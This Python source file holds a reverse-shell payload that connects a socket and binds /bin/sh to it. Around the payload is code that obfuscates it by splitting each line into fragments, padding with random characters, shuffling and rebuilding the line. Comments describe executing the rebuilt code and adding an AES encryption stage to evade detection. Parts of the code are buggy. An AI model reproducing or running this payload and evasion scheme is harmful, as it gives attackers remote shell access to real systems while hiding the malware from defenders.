import re,random,string


template_reverse_shell = """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
"""

template_reverse_shell = template_reverse_shell.strip().rstrip()
arrayList = []

def fillList(arrayBrokenShellCode,toFill):
    for i in range(0,toFill):
        arrayBrokenShellCode.append("aa")
    return arrayBrokenShellCode

def generateArrayList(l):
    arrayBrokenShellCode = re.findall('..?',l)
    # fix [] characters
    for pair in arrayBrokenShellCode:
        pair = pair.replace(r"[","\[").replace(r"]","\]")
    arrayBSOrig = list(arrayBrokenShellCode)
    # No more extend this time
    # We just repeatedly extend on our own the filler
    # # print arrayBrokenShellCode,type(arrayBrokenShellCode)
    toFill = 50 - len(arrayBrokenShellCode)
    arrayBrokenShellCode = fillList(arrayBrokenShellCode,toFill)
    # # print arrayBrokenShellCode,type(arrayBrokenShellCode)
    # filler = toFill*["aa"]
    # # # print type(filler)
    # arrayBrokenShellCode = arrayBrokenShellCode.extend(filler)

    # # print "DEBUG: type arrayBrokenShellCode",type(arrayBrokenShellCode)
    # # print "DEBUG: Broken apart shellcode, needs to be injected with fake characters\r\n",arrayBrokenShellCode
    arrayShuffled = random.sample(arrayBrokenShellCode,len(arrayBrokenShellCode))

    # # print "DEBUG: Shuffled\r\n",arrayShuffled,"\r\nlength of array {}".format(str(len(arrayShuffled)))



    for i in arrayShuffled:
        if i == 'aa' or None:
            char = ''.join(random.choice(string.ascii_lowercase) for i in range(2))
            # # # print char
            # char = arrayShuffled[arrayShuffled.index(i)]
            arrayShuffled[arrayShuffled.index(i)] = char
        # if '[' or ']' in i:
        #     i=i.replace('[','\[').replace(']','\]')
        # if i == None:
        #     char = ''.join(random.choice(string.ascii_lowercase) for i in range(2))
        #     # # # print char
        #     arrayShuffled[arrayShuffled.index(i)] = char
            # char = arrayShuffled[arrayShuffled.index(i)]
    
    # # print "DEBUG: New list, it shouldnt be this fucking hard", arrayShuffled,"\r\nlength of array {}".format(str(len(arrayShuffled)))
    

    
    return arrayShuffled,arrayBSOrig
scmap = []

def remap(arrayBSOrig,arrayShuffled):
    # # print "DEBUG: Original list\r\n",arrayBSOrig
    # arrayBSOrig = arrayBSOrig.pop('aa')
    # # print "DEBUG: Original list\r\n",arrayBSOrig

    for word in arrayBSOrig:
        # mapped=arrayShuffled(word.index())
        mapped = arrayShuffled.index(word)
        # # print mapped,type(mapped)
        scmap.append(mapped)
        # # # print scmap
    # # # print "MAP of indices of shuffled array: \r\n",scmap
    return scmap

def reconstituteSC(arrayShuffled,scmap):# Reconstitutes the obfuscated shellcode and executes it
# We have another stage. We need to AES encrypt it
# Executing: 
# import socket,subprocess,os
# Executing: 
# zeINozksM)pjockwetocvvtochck
# s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# Executing: 
# lrctt(4)oncvymgs0.sqbannvlpqzcvw)gowjymecs.vw)go1"jjctrncoymeczjtkkwrk0.7.on
# s.connect(("127.0.0.1",1234))
# Executing: 
# tntrrvdacokoxtictdydehtjmdyxonyyupihizxtnfsoyyupihrbmjtr.dosxtnfkg2(gheuccficosoostjnfrvs.()ficcccrbzsisdaupos.dup2(s.fileno(),0)
# Executing: 
# oslawwufjsxn2(fmsj().dyw)arrzkjclcvcn2(gruckjclcvledglaytbp2(grvwupcgwnaebzjsucbpywgrwws.ydbzaeaelediziufclbpytclups.bzfinuydvosjos.dup2(s.fileno(),1)
# Executing: 
# wp().dztpbgjavtsup2(iedj,2noideohtfgksavwjjeeohtfgzmgr()fimhavwjpk)siseuolepbjemhdjwj.dossmleuouozmonzvzthtmhfiht)osleekunsmdhqdwpie)avosekzmuv2(jp,2os.dup2(s.fileno(),2)
# Executing: 
# p=in/bssbyiifate["zytiabwkwsdj/s"]nxbkfapw.c/s"]nxvpifin,"-ifapwl(jyqtsuyth"by.c-iabpw/bceygh"ytytvplobpss"]-i,""]jyceh"ywpvygad)p=tijyfaceywvpogzyalwkce/b["zyog,"h"wsinwkjyp=subprocess.call(["/bin/sh","-i"])
    # print "DEBUG: Array Shuffled\r\n",arrayShuffled
    cmd=""
    for index in scmap:
        cmd += arrayShuffled[index]
        # print cmd
        # # # print cmd
    cmd = cmd.strip().rstrip()
    # print "Executing: \r\n",cmd
    # eval(cmd)
    return cmd
def main():

    lines = template_reverse_shell.splitlines()

    for l in lines:
        # arrayMap, arrayList = generateArrayList(l)
        arrayShuffled, arrayBSOrig = generateArrayList(l)
        scmap = remap(arrayBSOrig,arrayShuffled)
        reconstituteSC(arrayShuffled,scmap)    
    # create a map to help reconstruct the shellcode

    # scmap = remap(arrayBSOrig,arrayShuffled)
    # reconstituteSC(arrayShuffled,scmap)
    return
main()

